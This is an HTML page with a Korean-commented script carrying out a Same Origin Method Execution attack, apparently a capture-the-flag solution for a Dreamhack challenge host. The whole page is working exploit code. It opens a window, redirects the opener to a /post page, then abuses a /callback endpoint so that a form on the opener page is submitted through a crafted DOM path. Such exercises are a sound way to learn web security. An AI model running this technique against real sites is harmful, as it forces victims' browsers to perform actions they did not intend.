<!DOCTYPE html>
<html>
<head>
    <title>SOME Attack - Corrected</title>
</head>
<body>
    <h1>Exploiting...</h1>
    <script>
        // SOME (Same Origin Method Execution) Attack
        
        // Step 1: 새 창 열기
        const win = window.open('about:blank', 'attackWindow');
        
        // Step 2: 현재 창(opener가 될 창)을 /post로 리다이렉트
        setTimeout(() => {
            window.location = 'http://host3.dreamhack.games:23764/post';
        }, 500);
        
        // Step 3: 새 창에서 callback 페이지 로드
        setTimeout(() => {
            // 수정된 DOM 경로 (방법 1: 긴 경로)
            // const callback = 'window.opener.document.body.firstElementChild.nextElementSibling.firstElementChild.nextElementSibling.nextElementSibling.submit';
            
            // 수정된 DOM 경로 (방법 2: 짧은 경로 - lastElementChild 사용)
            const callback = 'window.opener.document.body.firstElementChild.nextElementSibling.lastElementChild.submit';
            
            win.location = 'http://host3.dreamhack.games:23764/callback?callback=' + callback;
        }, 2000);
    </script>
</body>
</html>